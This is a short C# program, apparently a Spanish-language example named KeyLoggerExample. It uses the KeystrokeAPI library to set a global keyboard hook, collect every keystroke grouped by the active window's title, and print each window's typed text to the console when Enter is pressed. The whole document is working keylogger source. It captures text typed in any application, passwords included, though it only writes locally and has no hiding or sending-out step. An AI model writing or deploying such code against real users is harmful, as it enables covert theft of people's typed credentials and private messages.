using Keystroke.API;
using Keystroke.API.CallbackObjects;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace KeyLoggerExample
{
    class Program
    {
        static Dictionary<string, string> characterBuffer = new Dictionary<string, string>(); 


        static void Main(string[] args)
        {
            // Install-Package KeystrokeAPI
            // Añadir Referencia de System.Windows.Forms 
            using (var api = new KeystrokeAPI())
            {
                api.CreateKeyboardHook((character) => { proccessKey(character); });             
                Application.Run();
            }
        }

        private static void proccessKey(KeyPressed keyPressed)
        {
            string ventaActual = keyPressed.CurrentWindow;
            string bufferDeTeclasTipeadas = characterBuffer.ContainsKey(ventaActual) ? characterBuffer[ventaActual] :null;
            if (KeyCode.Return == keyPressed.KeyCode)
            {
                if (bufferDeTeclasTipeadas != null)
                {
                    Console.WriteLine(ventaActual + " : " + bufferDeTeclasTipeadas);
                    characterBuffer[ventaActual] = null;
                }
            }
            else
            {
                if (bufferDeTeclasTipeadas != null)
                {
                    characterBuffer[ventaActual] = bufferDeTeclasTipeadas + keyPressed;
                }
                else
                {
                    characterBuffer[ventaActual] = "" + keyPressed;
                }
            }
        }
    }
}
